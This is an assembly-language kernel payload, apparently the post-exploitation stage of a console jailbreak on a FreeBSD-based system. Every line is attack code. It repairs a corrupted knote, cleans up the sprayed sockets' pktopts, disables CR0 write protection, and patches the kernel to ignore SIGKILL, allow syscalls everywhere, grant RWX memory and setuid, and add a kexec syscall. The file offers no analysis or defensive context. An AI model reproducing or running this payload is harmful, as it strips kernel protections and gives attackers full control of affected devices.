use64
start:
lea r8, [rel start]
; fix knote
mov rax, [r8+4064] ; real kn_fop
mov [rdi+104], rax
; cleanup
mov r9, [gs:0] ; struct thread
mov r9, [r9+8] ; struct proc
mov r9, [r9+0x48] ; struct filedesc
mov r9, [r9] ; fd_ofiles
mov eax, [r8+4084] ; master_sock
mov r10, [r9+8*rax] ; struct file
mov r10, [r10] ; struct socket
mov r10, [r10+24] ; pcb
mov r10, [r10+280] ; pktopts
mov qword [r10+16], 0 ; pktinfo
mov eax, [r8+4088] ; overlap_sock
mov r10, [r9+8*rax] ; struct file
mov r10, [r10] ; struct socket
mov r10, [r10+24] ; pcb
mov r10, [r10+280] ; pktopts
mov qword [r10+104], 0 ; rthdr
mov eax, [r8+4092]
mov r10, [r9+8*rax] ; struct file
mov r10, [r10] ; struct socket
mov r10, [r10+24] ; pcb
mov r10, [r10+280] ; pktopts
mov qword [r10+16], 0 ; pktinfo
; disable kernel WP
cli
mov rax, cr0
or rax, 0x10000
xor rax, 0x10000
mov cr0, rax
; apply patches
mov rax, [r8+4072] ; kernel_base
;; ignore SIGKILL
mov byte [rax+0x29287], 0xeb
;; syscall everywhere
mov dword [rax+0x490], 0
mov qword [rax+0x4b2], 0x19de9
;; mmap rwx (from mira)
mov byte [rax+0xab57a], 0x37
mov byte [rax+0xab57d], 0x37
;; mprotect rwx (from mira)
mov word [rax+0x451db8], 0x04eb
;; setuid (from mira)
mov byte [rax+0x10bed0], 0xb8
mov dword [rax+0x10bed1], 0
;; kexec (syscall #11)
mov qword [rax+0x111e210], 2
lea rcx, [rax+0x31c05c]
mov [rax+0x111e218], rcx
mov rcx, 0x100000000
mov [rax+0x111e238], rcx
; restore kernel WP
mov rax, cr0
or rax, 0x10000
mov cr0, rax
sti
; call the real f_detach
mov rax, [r8+4056] ; real f_detach
jmp rax

;; 0x29287 eb = ignore sigkill
